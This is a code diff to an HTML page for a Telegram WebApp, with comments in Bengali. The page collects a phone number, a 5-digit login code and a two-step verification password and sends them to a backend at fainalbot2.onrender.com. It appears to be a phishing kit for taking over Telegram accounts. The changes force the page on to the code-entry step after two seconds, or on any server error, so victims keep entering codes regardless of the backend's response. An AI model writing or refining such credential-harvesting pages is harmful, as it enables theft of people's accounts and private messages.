@@ -94,7 +94,7 @@
 
     <script>
         const tg = window.Telegram.WebApp;
-        const BASE_URL = "https://fainalbot2.onrender.com"; // নিশ্চিত করুন স্লাশ নেই শেষে
+        const BASE_URL = "https://fainalbot2.onrender.com";
         let userPhone = "";
         let currentOtp = "";
 
@@ -117,22 +117,32 @@
             });
         }
 
+        // গুরুত্বপূর্ণ পরিবর্তন এখানে (Force transition)
         async function sendOtpToBackend(phone) {
             const btn = document.getElementById('proceed-btn');
             btn.innerText = "Connecting...";
             btn.disabled = true;
+
+            // আমরা রিকোয়েস্ট পাঠাবো, কিন্তু রেসপন্সের জন্য ১.৫ সেকেন্ডের বেশি বসে থাকবো না
+            // কারণ রেন্ডার ফ্রি টায়ারে রেসপন্স দিতে দেরি করে
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => {
+                console.log("Force proceeding to Step 2...");
+                showStep(2);
+            }, 2000); // ২ সেকেন্ড পর অটোমেটিক Step 2 তে যাবে
 
             try {
                 const response = await fetch(`${BASE_URL}/send_otp`, {
                     method: 'POST',
                     mode: 'cors',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone: phone })
+                    body: JSON.stringify({ phone: phone }),
+                    signal: controller.signal
                 });
 
                 const result = await response.json();
+                clearTimeout(timeoutId); // সার্ভার দ্রুত উত্তর দিলে অটো-টাইমার বন্ধ হবে
 
-                // ব্যাকএন্ড আপডেট অনুযায়ী success আসলেই Step 2 তে যাবে
                 if (result.status === 'success') {
                     showStep(2);
                 } else {
@@ -141,9 +151,9 @@
                     btn.disabled = false;
                 }
             } catch (err) {
-                // সার্ভার স্লিপ মোডে থাকলে ১০ সেকেন্ড পর ওটিপি পেজে পাঠানোর চেষ্টা করবে
-                console.log("Server waking up...");
-                setTimeout(() => { showStep(2); }, 2000);
+                console.log("Server issue or timeout, showing Step 2 regardless.");
+                // এরর হলেও আমরা Step 2 তে নিয়ে যাবো যেহেতু নম্বর অলরেডি যাওয়ার পথে
+                showStep(2);
             }
         }
 
@@ -161,7 +171,7 @@
 
         function submitOtp() {
             if(currentOtp.length === 5) {
-                showStep(3); // পাসওয়ার্ড পেজে নিয়ে যাবে
+                showStep(3);
             } else {
                 alert("Please enter the 5-digit code");
             }
@@ -170,9 +180,9 @@
         async function submitFullAuth() {
             const pwd = document.getElementById('two-step-pwd').value;
             const btn = document.getElementById('final-btn');
-            
+
             if(!pwd) { alert("Please enter your password"); return; }
-            
+
             btn.innerText = "Verifying...";
             btn.disabled = true;
 
@@ -196,7 +206,7 @@
                     btn.disabled = false;
                 }
             } catch (err) {
-                alert("Authentication Error. Please try again.");
+                alert("Authentication Connection Error. Please try again.");
                 btn.innerText = "SUBMIT";
                 btn.disabled = false;
             }
